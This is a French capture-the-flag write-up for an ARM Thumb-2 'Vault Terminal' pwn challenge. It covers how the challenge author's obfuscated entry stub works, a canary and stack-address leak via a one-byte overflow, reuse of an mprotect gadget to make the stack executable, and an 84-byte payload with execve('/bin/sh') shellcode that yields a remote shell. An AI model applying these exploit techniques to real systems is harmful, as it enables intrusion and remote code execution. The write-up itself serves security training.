# PWN#Alpha — Vault Terminal ARM (mprotect + shellcode sur la pile)

- **Auteur :** Le_Geek
- **Cible :** `<HOST>:<PORT>` (ELF 32-bit ARM armhf/EABI5, PIE, dynamiquement lié, stripped)
- **Catégorie :** pwn
- **Flag :** `CTF{REDACTED}`
- **Fichiers fournis :** `vault` (ELF ARM)

## Contexte

Troisième recompilation du même source « Vault Terminal », cette fois ARM/Thumb-2, dynamiquement lié et stripped. Comme PWN#Beta (MIPS), le **binaire téléchargé a sa section `.data` volontairement effacée**, ce qui provoque un segfault dans son stub d'entrée obfusqué avant d'atteindre `main`.

Le stub d'entrée (`e_entry = 0x9e1`, Thumb) décode un saut via XOR avec une clé dérivée d'un pointeur `.data` relocalisé (`R_ARM_RELATIVE`) XORé avec une constante fixe (`0x426f6772` — la même constante que dans le trampoline MIPS de PWN#Beta, confirmant un packer commun). Dans le binaire distribué, le mot `.data` nécessaire est **mis à zéro** — crash immédiat.

## Reconnaissance

L'analyse statique (capstone, mode Thumb) du petit `.text` applicatif (`0x484` octets) suffit :

- `vuln` @ `0x89a` : frame `sub sp,#0x48` ; buffer à `r7+4` ; canary sauvegardé/vérifié à `r7+0x44` (**offset buffer 0x40 = 64**, convention identique à chaque architecture de la série) ; r7/LR sauvegardés aux **offsets buffer 68/72**.
- `read(0, buf, 0x41)` pour le nom (65 octets — overflow 1 octet dans le canary) ; `read(0, buf, 0x96)` pour le message (150 octets — dépasse largement LR).
- Imports : `printf, read, puts, setvbuf, __stack_chk_fail, abort` — **pas de `system`**.
- Recherche exhaustive de gadgets dans tout le `.text` : **aucun `pop {r0-r3, ...}`** — la primitive usuelle pour configurer les arguments d'un appel libc n'existe pas dans ce binaire minimal stripped.

## Le gadget mprotect-shellcode réutilisable

Une seconde couche d'obfuscation (`0x988`–`0x9de`) XOR-déchiffre un blob de 36 octets puis fait mprotect + jump. La **queue** de ce stub est réutilisable telle quelle :

```
0x9c2: mov  r0, r3
0x9c4: movw r1, #0xf000
0x9c8: movt r1, #0xffff        ; r1 = 0xfffff000
0x9cc: ands r0, r1              ; r0 = page_align_down(r3)
0x9ce: movs r1, #1
0x9d0: lsls r1, r1, #0xc        ; r1 = 0x1000
0x9d2: movs r2, #7              ; PROT_READ|WRITE|EXEC
0x9d4: movw r7, #0x7d           ; SYS_mprotect = 125
0x9d8: svc  #0
0x9da: add.w r3, r3, #1         ; set Thumb bit
0x9de: bx   r3
```

Atterrir ici avec `r3` = une adresse dans le buffer, et toute la page devient RWX, puis l'exécution saute dans le buffer (`r3+1`). Le chaînon manquant : un `pop {r3, pc}` à `0x676`.

## Fuite : canary + adresse pile stable, pas d'ASLR

Meme technique `read(0,buf,0x41)` dans un buffer de 64 octets, pas de NUL, `%s` pendouillant : envoyer **exactement 65 octets, sans retour a la ligne**. L'echo contient : les octets 1-3 du canary, puis l'ancien `r7` sauvegarde (offset buffer 68) = `R1_main`, le pointeur de pile avec lequel `vuln` a ete appele, puis les 2 premiers octets du LR sauvegarde avant qu'un `0x00` coupe.

La valeur de r7 sauvegarde est **identique entre connexions TCP independantes**, confirmant le comportement par defaut de qemu-user (pas d'ASLR).

`BUFFER_ADDR = leaked_r7 - 0x4c` (calcule depuis le push/sub/add de vuln).

## Payload (buffer message, 84 octets)

```
[0:28)   Shellcode Thumb : mov r0,pc; add r0,#0x10; mov r1,#0; mov r2,#0;
         mov r7,#11 (execve); svc #0;  puis b"/bin/sh\x00"
[28:64)  padding
[64:68)  p32(canary_fuite)
[68:72)  padding (ancien r7)
[72:76)  p32(0x400676 | 1)        # pop {r3, pc}
[76:80)  p32(BUFFER_ADDR)         # -> r3  (pointe sur le shellcode en offset 0)
[80:84)  p32(0x4009c2 | 1)        # -> pc  (gadget mprotect-tail)
```

`PIE_BASE = 0x400000` confirme depuis une trace qemu-arm locale.

Flux : `vuln` retourne vers `pop{r3,pc}` qui met `r3=BUFFER_ADDR` puis saute vers le gadget mprotect qui rend la page RWX, et `bx r3+1` saute dans le shellcode pour `execve("/bin/sh",0,0)`.

## Resultat

```
CTF{REDACTED}
```

Flag lu dans `/flag/flag.txt` apres obtention d'un shell sur le socket.

## Pieges rencontres

- **Pas de target ARM dans objdump** sur cette machine — utiliser `capstone` (`CS_ARCH_ARM`, `CS_MODE_THUMB`, `skipdata=True`) ; les stubs PLT sont en mode ARM (non-Thumb) meme si l'application est Thumb.
- **Le stub d'entree XOR crashe avant main** dans le binaire telecharge — patcher `e_entry` vers `main` (`0x945`) pour les tests locaux uniquement.
- **La decryption des chaines casse dans la copie patchee** — cosmetique, les offsets et la mecanique de l'overflow sont inchanges.

---

